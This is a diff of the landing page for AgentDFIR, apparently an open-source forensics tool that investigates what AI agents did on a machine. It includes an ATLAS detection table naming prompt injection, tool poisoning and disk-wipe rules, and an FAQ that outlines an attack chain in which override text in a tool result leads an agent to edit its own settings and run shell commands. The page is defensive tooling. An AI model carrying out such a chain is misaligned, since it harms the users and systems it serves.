+          <tr><td>AML.T0099</td><td>AI Agent Tool Data Poisoning</td><td>CHAIN_MCP_RESULT_TO_DESTRUCTIVE, MCP_TOOL_POISONING</td></tr>
+          <tr><td>AML.T0051</td><td>LLM Prompt Injection</td><td>INSTRUCTION_INJECTION_PHRASE, PROMPT_INJECTION_INDICATOR, ROLE_MARKER_SMUGGLING</td></tr>
+          <tr><td>AML.T0068</td><td>LLM Prompt Obfuscation</td><td>INVISIBLE_UNICODE_INSTRUCTION</td></tr>
+          <tr><td>AML.T0010</td><td>AI Supply Chain Compromise</td><td>UNPINNED_MCP_PACKAGE, MCP_REMOTE_FETCH_COMMAND, CHAIN_INJECTION_TO_PUSH…</td></tr>
+          <tr><td>AML.T0101</td><td>Data Destruction via AI Agent Tool Invocation</td><td>CHAIN_ACTION_THEN_LOG_TAMPER, DESTRUCTIVE_COMMAND, DISK_WIPE</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <a class="more" href="https://github.com/efij/AgentDFIR/blob/main/docs/detection-coverage.md">Full matrix: 140 detections, 27 ATLAS techniques</a>
+
+    <div class="stg integ" style="margin-top:56px">
+      <div><h3>Collect from anywhere</h3><p>this machine · --path image<br>--import KAPE/Velociraptor/CyLR<br>--docker · --archive CI</p></div>
+      <div><h3>Second witness</h3><p>auditd · Sysmon XML<br>EDR JSONL/CSV · eslogger<br>MCP gateway logs</p></div>
+      <div><h3>Export to your stack</h3><p>OCSF 1.3 · SARIF 2.1 · STIX 2.1<br>Sigma · OTel · Timesketch<br>l2tcsv · PDF · HTML</p></div>
+      <div><h3>Deploy at scale</h3><p>KAPE target + module<br>Velociraptor artifact<br>signed product packs</p></div>
     </div>
   </div>
 </section>
 
 <section id="install">
   <div class="wrap">
-    <h2 style="max-width:14em">One command does all of it. Or run each step yourself.</h2>
-    <p class="lede" style="margin-top:22px"><code>agentdfir run</code> is the four commands below in order, sharing the same code.</p>
-    <ol class="steps">
-      <li><h3>Detect</h3><p>Finds which AI agents are on this machine. Never runs them.</p><code>agentdfir detect</code></li>
-      <li><h3>Collect</h3><p>Copies their evidence into one sealed, hash-chained package.</p><code>agentdfir collect --case-id CASE-042</code></li>
-      <li><h3>Analyze</h3><p>Runs every detection, the MCP audit and provenance.</p><code>agentdfir analyze CASE-042.adfir</code></li>
-      <li><h3>Look</h3><p>Opens the explorer in your browser, on this machine only.</p><code>agentdfir serve CASE-042.adfir --open</code></li>
+    <div class="rv head">
+      <h2>One command, or four.</h2>
+      <p class="sub"><code>agentdfir run</code> is the four steps below, same code. Run them one at a time on a disk image, a KAPE tree or a container.</p>
+    </div>
+    <ol class="stg steps">
+      <li><span class="n">01</span><h3>Detect</h3><p>Which agents are installed. Nothing is executed.</p><code>agentdfir detect</code></li>
+      <li><span class="n">02</span><h3>Collect</h3><p>Sealed, hash-chained evidence package.</p><code>agentdfir collect --case-id IR-042</code></li>
+      <li><span class="n">03</span><h3>Analyze</h3><p>Detections, chains, MCP audit, provenance.</p><code>agentdfir analyze IR-042.adfir</code></li>
+      <li><span class="n">04</span><h3>Investigate</h3><p>Case explorer on 127.0.0.1, or reports.</p><code>agentdfir serve IR-042.adfir</code></li>
     </ol>
-    <div class="more-src">
-      <div><code>brew install efij/agentdfir/agentdfir</code><span>Homebrew</span></div>
-      <div><code>choco install agentdfir</code><span>Chocolatey</span></div>
-      <div><code>scoop bucket add agentdfir https://github.com/efij/scoop-agentdfir; scoop install agentdfir</code><span>Scoop</span></div>
-      <div><code>irm https://raw.githubusercontent.com/efij/AgentDFIR/main/install.ps1 | iex</code><span>Windows x64 and ARM64</span></div>
-      <div><code>agentdfir collect --path /mnt/image/Users/x</code><span>A copied home folder or a mounted disk image</span></div>
-      <div><code>agentdfir collect --docker my-container</code><span>A running container, read-only</span></div>
-      <div><code>agentdfir analyze CASE.adfir --endpoint audit.log</code><span>Add auditd or Sysmon as a second witness</span></div>
-      <div><code>agentdfir run --no-serve</code><span>Print the findings and stop, for scripts and CI</span></div>
+    <div class="stg chan">
+      <div><span>Homebrew</span><code>brew install efij/agentdfir/agentdfir</code></div>
+      <div><span>Chocolatey</span><code>choco install agentdfir</code></div>
+      <div><span>Scoop</span><code>scoop bucket add agentdfir https://github.com/efij/scoop-agentdfir; scoop install agentdfir</code></div>
+      <div><span>Windows script</span><code>irm https://raw.githubusercontent.com/efij/AgentDFIR/main/install.ps1 | iex</code></div>
+      <div><span>Go</span><code>go install github.com/efij/AgentDFIR/v2/cmd/agentdfir@latest</code></div>
+      <div><span>Verify a release</span><span>Every asset ships a Sigstore bundle; <code>cosign verify-blob --offline</code> works air-gapped. <a class="more" style="margin:0" href="https://github.com/efij/AgentDFIR/blob/main/docs/install.md">Exact command</a></span></div>
     </div>
   </div>
 </section>
 
 <section id="faq" class="band">
   <div class="wrap">
-    <h2>Questions people ask first</h2>
-    <div class="faq">
+    <div class="rv head"><h2>Questions from responders</h2></div>
+    <div class="rv faq">
       <div>
-        <details open><summary>What is AI agent forensics?</summary><p>Collecting, preserving and analyzing what agentic AI tools leave on a computer — session transcripts, helper-agent records, MCP configuration, hooks and tool-call logs — so an investigator can reconstruct who told which agent to do what, through which tool and account, and what evidence proves it.</p></details>
-        <details><summary>Is a model’s own account of its actions evidence?</summary><p>No. “I executed curl example.com” in model output is a claim, marked <code>REPORTED</code>. A tool-call record in the transcript makes it <code>OBSERVED</code>, and only independent endpoint or network evidence makes it <code>CORROBORATED</code>.</p></details>
-        <details><summary>What is an attack chain?</summary><p>Steps that are harmless alone and an attack together: instruction-override text in a tool answer, then the agent editing its own settings, then a shell command, in one session within two hours. AgentDFIR matches eight such <a href="https://github.com/efij/AgentDFIR/blob/main/docs/attack-chains.md">chains</a> and reports each as one finding with the exact steps.</p></details>
+        <details open><summary>What is AI agent forensics?</summary><p>Collecting, preserving and analyzing what agentic AI tools leave on endpoints — session transcripts, subagent records, MCP configuration, hooks and tool-call logs — so a responder can reconstruct who instructed which agent to do what, through which tool and account, and what evidence proves it.</p></details>
+        <details><summary>Where does Claude Code store session logs?</summary><p>Transcripts are JSONL under <code>~/.claude/projects/&lt;project&gt;/&lt;session-id&gt;.jsonl</code>, prompt history in <code>~/.claude/history.jsonl</code>, settings, hooks, skills and plugins under <code>~/.claude/</code>, and MCP servers in <code>~/.claude.json</code>. AgentDFIR acquires all of them, including subagent and orphan-agent transcripts. See the <a href="https://github.com/efij/AgentDFIR/blob/main/docs/claude-code-forensic-artifacts.md">artifact reference</a>.</p></details>
+        <details><summary>Is anything sent off the machine?</summary><p>No. No account, no cloud, no telemetry, no language model in the analysis. The explorer binds to 127.0.0.1, serves a strict CSP with no external resources, and never writes to the sealed evidence.</p></details>
       </div>
       <div>
-        <details open><summary>Do I need to be a forensics expert?</summary><p>No. <code>agentdfir run</code> does everything, and the explorer explains each finding in plain language with the log line behind it. The individual commands are there for investigators working from disk images, containers or KAPE trees.</p></details>
-        <details><summary>Where does Claude Code store session logs?</summary><p>Transcripts are JSONL files under <code>~/.claude/projects/&lt;project&gt;/&lt;session-id&gt;.jsonl</code>, prompt history is in <code>~/.claude/history.jsonl</code>, settings, hooks, skills and plugins are under <code>~/.claude/</code>, and MCP servers are configured in <code>~/.claude.json</code>. AgentDFIR collects all of them, including helper-agent and orphan-agent transcripts.</p></details>
-        <details><summary>What does it detect?</summary><p>140 deterministic rules, including orphan agents, cross-agent messaging, destructive and exfiltrating commands, agents editing their own instructions or hooks, credentials read from agent config, poisoned or unpinned MCP servers, honeytoken hits and gaps in the transcript. See the <a href="https://github.com/efij/AgentDFIR/blob/main/docs/detection-coverage.md">coverage matrix</a>.</p></details>
+        <details open><summary>What is an attack chain?</summary><p>An ordered sequence of agent events that is unremarkable alone and an attack together: instruction-override content in a tool result, then the agent writing its own settings, then a shell command, in one session within a time window. Eight chains ship built in; you can add your own in JSON.</p></details>
+        <details><summary>Does it work on a disk image or a KAPE collection?</summary><p>Yes. <code>collect --path</code> takes a copied home or a mounted image, <code>--import</code> takes a KAPE, Velociraptor or CyLR tree with every user and every agent, <code>--docker</code> snapshots a container read-only and <code>--archive</code> ingests CI artifacts and support bundles.</p></details>
+        <details><summary>What does it detect?</summary><p>140 deterministic rules: orphan agents, cross-agent messaging, destructive and exfiltrating commands, agents editing their own instructions or hooks, credentials read from agent config, poisoned or unpinned MCP servers, honeytoken hits and transcript integrity gaps. See the <a href="https://github.com/efij/AgentDFIR/blob/main/docs/detection-coverage.md">coverage matrix</a>.</p></details>
       </div>
     </div>
   </div>
@@ -507,37 +610,37 @@ footer a:hover{color:var(--ink)}
 
 <section id="docs">
   <div class="wrap">
-    <h2>Documentation and open schemas</h2>
-    <div class="docs">
+    <div class="rv head"><h2>Documentation and open schemas</h2></div>
+    <div class="stg docs">
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/install.md"><b>Install</b><span>Every channel, SHA-256 and Sigstore verification, air-gapped use.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/serve.md"><b>Case explorer</b><span>Overview, findings, the story diagram, activity, search and case notes.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/serve.md"><b>Case explorer</b><span>Overview, findings, story diagram, activity, search, case notes.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/detection-coverage.md"><b>Detection coverage</b><span>140 detections mapped to MITRE ATLAS 5.6 and ATT&amp;CK.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/attack-chains.md"><b>Attack chains</b><span>The eight built-in chains and how to write your own.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/claude-code-forensic-artifacts.md"><b>Claude Code artifacts</b><span>Every on-disk location and the JSONL session schema.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/mcp-audit.md"><b>MCP supply-chain audit</b><span>Inventory, risky configuration, poisoning and drift.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/endpoint-corroboration.md"><b>Endpoint corroboration</b><span>auditd, Sysmon and EDR exports as a second witness.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/provenance.md"><b>Instruction provenance</b><span>Who wrote each line of an agent’s instruction files.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/realtime-detection.md"><b>Real-time detection</b><span>Alerts to webhook, syslog or file within seconds.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/container-ci-collection.md"><b>Containers and CI</b><span>Read-only container snapshots and CI archive ingestion.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/provenance.md"><b>Instruction provenance</b><span>Who wrote each line of an agent's instruction files.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/realtime-detection.md"><b>Real-time detection</b><span>Webhook, syslog or file alerts within seconds.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/dfir-interop.md"><b>DFIR interop</b><span>KAPE, Velociraptor, CyLR in; Timesketch and l2tcsv out.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/siem-interop.md"><b>SIEM interop</b><span>OCSF 1.3, SARIF 2.1 and Sigma export.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/dfir-interop.md"><b>DFIR interop</b><span>KAPE, Velociraptor and CyLR in; Timesketch and l2tcsv out.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/product-packs.md"><b>Product packs</b><span>Add a new AI agent with one signed JSON file.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/container-ci-collection.md"><b>Containers and CI</b><span>Read-only container snapshots, CI archive ingestion.</span></a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/docs/adfir-spec.md"><b>.adfir package spec</b><span>Two zones, content addressing, hash chaining, verification.</span></a>
-      <a href="schema/event.schema.json"><b>Event schema</b><span>The unified agent event, JSON Schema 2020-12.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/product-packs.md"><b>Product packs</b><span>Add a new AI agent with one signed JSON file.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/tree/main/compliance"><b>Compliance mappings</b><span>ISO/IEC 27037, NIST AI RMF, GDPR, EU AI Act.</span></a>
+      <a href="schema/event.schema.json"><b>Event schema</b><span>Unified agent event, JSON Schema 2020-12.</span></a>
       <a href="schema/finding.schema.json"><b>Finding schema</b><span>Findings with evidence references and corroboration state.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/blob/main/docs/mcp-forensics.md"><b>MCP forensics</b><span>Investigating MCP config and tool activity.</span></a>
-      <a href="https://github.com/efij/AgentDFIR/tree/main/compliance"><b>Compliance mappings</b><span>ISO/IEC 27037, NIST AI RMF, GDPR and the EU AI Act.</span></a>
+      <a href="https://github.com/efij/AgentDFIR/blob/main/SECURITY.md"><b>Security policy</b><span>Reporting vulnerabilities and the tool's threat model.</span></a>
     </div>
   </div>
 </section>
 
-<section class="close">
-  <div class="wrap">
-    <h2>Know what your agents did, <em>before someone asks.</em></h2>
-    <p class="lede">Free and MIT-licensed. One static binary with no runtime dependencies, small enough to audit in an afternoon.</p>
+<section class="close band">
+  <div class="wrap rv">
+    <h2>Your agents have shell access. Know what they did with it.</h2>
+    <p class="sub">MIT-licensed. One static binary, no runtime dependencies, auditable in an afternoon.</p>
     <div class="ctas">
-      <button class="pill fill" type="button" data-copy-active>Copy the install command</button>
-      <a class="pill ghost" href="https://github.com/efij/AgentDFIR">Star on GitHub</a>
+      <a class="btn primary" href="#install">Install AgentDFIR</a>
+      <a class="btn" href="https://github.com/efij/AgentDFIR">Star on GitHub</a>
     </div>
   </div>
 </section>
@@ -545,9 +648,10 @@ footer a:hover{color:var(--ink)}
 
 <footer>
   <div class="wrap">
-    <span>AgentDFIR, open-source forensics for AI agents. MIT License.</span>
+    <span>AgentDFIR · open-source DFIR for AI agents · MIT</span>
     <nav aria-label="Footer">
       <a href="https://github.com/efij/AgentDFIR">GitHub</a>
+      <a href="https://github.com/efij/AgentDFIR/releases">Releases</a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/CHANGELOG.md">Changelog</a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/CONTRIBUTING.md">Contributing</a>
       <a href="https://github.com/efij/AgentDFIR/blob/main/SECURITY.md">Security</a>
@@ -555,33 +659,66 @@ footer a:hover{color:var(--ink)}
   </div>
 </footer>
 
-<div class="toast" id="toast" role="status" aria-live="polite"></div>
-
 <script>
 (function(){
-  var CMDS={
-    unix:['$','curl -fsSL https://raw.githubusercontent.com/efij/AgentDFIR/main/install.sh | sh && ~/.local/bin/agentdfir run'],
+  var C={unix:['$','curl -fsSL https://raw.githubusercontent.com/efij/AgentDFIR/main/install.sh | sh && ~/.local/bin/agentdfir run'],
     win:['>','irm https://raw.githubusercontent.com/efij/AgentDFIR/main/install.ps1 | iex; agentdfir run'],
     brew:['$','brew install efij/agentdfir/agentdfir && agentdfir run'],
-    choco:['>','choco install agentdfir; agentdfir run']
-  };
+    choco:['>','choco install agentdfir; agentdfir run'],
+    go:['$','go install github.com/efij/AgentDFIR/v2/cmd/agentdfir@latest && agentdfir run']};
   var os=/Win/.test(navigator.platform||navigator.userAgent)?'win':'unix';
-  var body=document.getElementById('cmd-body'), prompt=document.querySelector('#cmd-text .p');
-  var tabs=document.querySelectorAll('.cmd-tabs button');
-  function pick(k){os=k;prompt.textContent=CMDS[k][0];body.textContent=CMDS[k][1];
-    tabs.forEach(function(t){t.setAttribute('aria-selected',String(t.dataset.os===k))});}
+  var body=document.getElementById('cmd-body'),p=document.getElementById('cmd-p'),tabs=document.querySelectorAll('.term-top button'),btn=document.getElementById('copy');
+  function pick(k){os=k;p.textContent=C[k][0];body.textContent=C[k][1];tabs.forEach(function(t){t.setAttribute('aria-selected',String(t.dataset.os===k))})}
   tabs.forEach(function(t){t.addEventListener('click',function(){pick(t.dataset.os)})});
   pick(os);
-  var toast=document.getElementById('toast'), tm;
-  function say(s){toast.textContent=s;toast.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){toast.classList.remove('on')},1800)}
-  document.querySelectorAll('[data-copy-active]').forEach(function(b){
-    b.addEventListener('click',function(){
-      var t=CMDS[os][1];
-      var ok=function(){say('Copied. Paste it into a terminal.')};
-      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(ok,function(){say('Select the command and copy it.')})}
-      else{var r=document.createRange();r.selectNodeContents(body);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');ok()}catch(e){}}
-    });
+  btn.addEventListener('click',function(){
+    var done=function(){btn.textContent='copied';btn.classList.add('ok');setTimeout(function(){btn.textContent='copy';btn.classList.remove('ok')},1600)};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(C[os][1]).then(done,function(){})}
+    else{var r=document.createRange();r.selectNodeContents(body);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done()}catch(e){}}
   });
+})();
+
+(function(){
+  var reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
+  // terminal: print the run output line by line after the hero settles
+  var out=document.querySelector('.out');
+  if(out){
+    var lines=out.innerHTML.split('\n');
+    out.innerHTML=lines.map(function(l){return '<span class="ln">'+l+'</span>'}).join('\n')+'<span class="cursor" aria-hidden="true"></span>';
+    var ls=out.querySelectorAll('.ln');
+    ls.forEach(function(l,i){setTimeout(function(){l.classList.add('on')},reduce?0:900+i*380)});
+  }
+  // verify panels: lines appear in order when scrolled to
+  document.querySelectorAll('.panel pre').forEach(function(pre){
+    pre.innerHTML=pre.innerHTML.split('\n').map(function(l){return '<span class="tl">'+l+'</span>'}).join('\n');
+  });
+  // stagger children of .st blocks
+  document.querySelectorAll('.stg').forEach(function(el){
+    Array.prototype.forEach.call(el.children,function(c,i){c.style.transitionDelay=(Math.min(i,10)*70)+'ms'});
+  });
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){
+      if(!e.isIntersecting) return;
+      var t=e.target; t.classList.add('in'); io.unobserve(t);
+      t.querySelectorAll&&t.querySelectorAll('.panel pre').forEach(function(pre){
+        pre.querySelectorAll('.tl').forEach(function(l,i){setTimeout(function(){l.classList.add('on')},reduce?0:i*110)});
+      });
+    });
+  },{threshold:.15,rootMargin:'0px 0px -8% 0px'});
+  document.querySelectorAll('.rv,.stg,.window,.shot').forEach(function(el){io.observe(el)});
+  // the floating close-up drifts slightly against the scroll
+  var shot=document.querySelector('.shot');
+  if(shot&&!reduce){
+    var tick=false;
+    addEventListener('scroll',function(){
+      if(tick) return; tick=true;
+      requestAnimationFrame(function(){
+        var r=shot.parentNode.getBoundingClientRect(), k=Math.max(-1,Math.min(1,r.top/innerHeight));
+        if(shot.classList.contains('in')) shot.style.transform='translateY('+(k*-40).toFixed(1)+'px) rotate(1.2deg)';
+        tick=false;
+      });
+    },{passive:true});
+  }
 })();
 </script>
 </body>
